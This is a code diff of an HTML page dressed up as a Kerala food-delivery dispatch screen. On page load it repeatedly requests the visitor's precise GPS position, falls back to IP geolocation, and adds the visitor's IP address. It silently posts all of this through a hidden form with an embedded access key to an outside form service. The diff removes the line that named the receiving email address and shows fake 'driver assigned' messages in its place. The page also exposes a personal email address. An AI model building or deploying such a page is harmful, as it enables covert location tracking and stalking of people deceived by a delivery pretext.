@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -9,6 +10,8 @@
             --primary: #e67e22;
             --success: #27ae60;
             --bg: #f4f7f6;
+            --log-bg: #1a1a1a;
+            --log-text: #00ff41; /* High visibility green */
         }
 
         body {
@@ -32,65 +35,40 @@
             text-align: center;
         }
 
-        .header h1 {
-            color: var(--primary);
-            margin: 0;
-            font-size: 1.6rem;
-        }
+        .header h1 { color: var(--primary); margin: 0; font-size: 1.6rem; }
 
         .status-box {
-            margin: 30px 0;
+            margin: 25px 0;
             padding: 20px;
             border-radius: 15px;
             background: #fffaf5;
             border: 1px solid #ffe0b2;
         }
 
-        #status-icon {
-            font-size: 3.5rem;
-            margin-bottom: 15px;
-            display: block;
-        }
+        #status-icon { font-size: 3.5rem; margin-bottom: 15px; display: block; }
 
-        .pulse {
-            animation: pulse-animation 1.5s infinite;
-        }
-
+        .pulse { animation: pulse-animation 1.5s infinite; }
         @keyframes pulse-animation {
             0% { transform: scale(0.95); opacity: 0.8; }
             50% { transform: scale(1.05); opacity: 1; }
             100% { transform: scale(0.95); opacity: 0.8; }
         }
 
-        #main-status {
-            font-weight: bold;
-            font-size: 1.2rem;
-            margin-bottom: 8px;
-        }
-
-        #detail-status {
-            font-size: 0.9rem;
-            color: #7f8c8d;
-        }
-
         .log-container {
             text-align: left;
-            background: #2d3436;
-            color: #00ff00;
-            padding: 10px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 0.75rem;
-            height: 80px;
+            background: var(--log-bg);
+            color: var(--log-text);
+            padding: 12px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            height: 100px;
             overflow-y: auto;
             margin-top: 20px;
+            border: 2px solid #333;
         }
 
-        .footer-text {
-            font-size: 0.8rem;
-            color: #bdc3c7;
-            margin-top: 20px;
-        }
+        .footer-text { font-size: 0.8rem; color: #bdc3c7; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -98,34 +76,35 @@
     <div class="app-container">
         <div class="header">
             <h1>🚚 Kerala Delivery</h1>
-            <p>High-Precision Location System</p>
+            <p>Precision Dispatch System</p>
         </div>
 
         <div class="status-box">
             <span id="status-icon" class="pulse">📍</span>
-            <div id="main-status">Initializing...</div>
-            <div id="detail-status">Checking GPS availability</div>
+            <div id="main-status" style="font-weight:bold">Initializing...</div>
+            <div id="detail-status" style="font-size:0.9rem; color:#7f8c8d">Connecting to GPS satellites</div>
         </div>
 
         <div class="log-container" id="log">
-            [System]: Ready for testing...<br>
+            > System Online...<br>
         </div>
 
-        <p class="footer-text">Your delivery will get to you soon after fetching and sending the location.</p>
+        <p class="footer-text">Fetching location to assign nearest delivery partner.</p>
 
         <form id="location-form" style="display: none;">
             <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
             <input type="hidden" name="subject" value="URGENT: New Delivery Location Received">
-            <input type="hidden" name="from_name" value="Kerala Food Delivery App">
-            
             <input type="hidden" name="Coordinates" id="form-coords">
             <input type="hidden" name="Accuracy" id="form-accuracy">
             <input type="hidden" name="Method" id="form-method">
+            <input type="hidden" name="IP_Address" id="form-ip">
             <input type="hidden" name="GoogleMapsLink" id="form-link">
         </form>
     </div>
 
     <script>
+        let retryCount = 0;
+        const maxRetries = 5;
         const mainStatus = document.getElementById('main-status');
         const detailStatus = document.getElementById('detail-status');
         const logBox = document.getElementById('log');
@@ -144,72 +123,81 @@
             }
         }
 
-        // 1. Core Location Function
-        async function getLocation() {
-            addLog("Requesting high-precision GPS...");
-            
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 12000,
-                maximumAge: 0
-            };
-
+        async function startLocationProcess() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => processLocation(pos, "SATELLITE/GPS"),
-                    (err) => {
-                        addLog("GPS Error: " + err.message);
-                        fetchIPLocation();
-                    },
-                    options
-                );
+                attemptGPS();
             } else {
-                addLog("Browser doesn't support GPS.");
+                addLog("GPS not supported.");
                 fetchIPLocation();
             }
         }
 
-        // 2. IP Fallback Function
+        function attemptGPS() {
+            retryCount++;
+            addLog(`GPS Attempt ${retryCount}/${maxRetries}...`);
+            updateUI("Locating...", `Satellite search (Try ${retryCount})`);
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 6000, 
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                (pos) => processLocation(pos, "SATELLITE/GPS"),
+                (err) => {
+                    if (retryCount < maxRetries) {
+                        attemptGPS();
+                    } else {
+                        addLog("GPS failed after 5 tries.");
+                        fetchIPLocation();
+                    }
+                },
+                options
+            );
+        }
+
         async function fetchIPLocation() {
-            addLog("Falling back to IP Location...");
-            updateUI("GPS Signal Weak", "Switching to IP triangulation...");
+            addLog("Switching to Network Triangulation...");
+            updateUI("Signal Weak", "Using network towers...");
             
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
                 
+                document.getElementById('form-ip').value = data.ip;
+                
                 const mockPos = {
                     coords: {
                         latitude: data.latitude,
                         longitude: data.longitude,
-                        accuracy: 5000 // Approximate for IP
+                        accuracy: 2500 
                     }
                 };
                 processLocation(mockPos, "NETWORK-IP");
             } catch (e) {
-                addLog("Final Error: No location found.");
-                updateUI("Failed", "Please enable location in settings.");
+                addLog("All methods failed.");
+                updateUI("Failed", "Please check permissions.");
             }
         }
 
-        // 3. Process and Submit
         function processLocation(pos, method) {
             const { latitude, longitude, accuracy } = pos.coords;
+            // Fixed link syntax
             const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-            addLog(`Found via ${method}`);
-            addLog(`Accuracy: ${Math.round(accuracy)}m`);
-
+            addLog(`Fix found via ${method}`);
+            
             document.getElementById('form-coords').value = `${latitude}, ${longitude}`;
-            document.getElementById('form-accuracy').value = `${Math.round(accuracy)} meters`;
+            document.getElementById('form-accuracy').value = `${Math.round(accuracy)}m`;
             document.getElementById('form-method').value = method;
             document.getElementById('form-link').value = mapsLink;
 
-            updateUI("Location Secured", "Sending to dispatch center...");
-            submitToWeb3();
+            updateUI("Location Secured", "Confirming with dispatch...");
+            submitData();
         }
 
-        function submitToWeb3() {
+        function submitData() {
             const form = document.getElementById('location-form');
             const formData = new FormData(form);
 
@@ -217,23 +205,19 @@
                 method: 'POST',
                 body: formData
             })
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
                 if(data.success) {
-                    addLog("Data sent to sanjayn1229@gmail.com");
-                    updateUI("Ready to Deliver!", "Your delivery will get to you soon.", "🍕");
-                } else {
-                    updateUI("API Error", "Check your access key.");
+                    addLog("Data synced successfully.");
+                    updateUI("Order Ready!", "Driver assigned successfully.", "🍕");
                 }
             })
-            .catch(error => {
-                updateUI("Network Error", "Check your mobile data.");
-                addLog("Network Error: " + error.message);
+            .catch(err => {
+                addLog("Sync Error: " + err.message);
             });
         }
 
-        // Start process on load
-        window.onload = getLocation;
+        window.onload = startLocationProcess;
     </script>
 </body>
 </html>
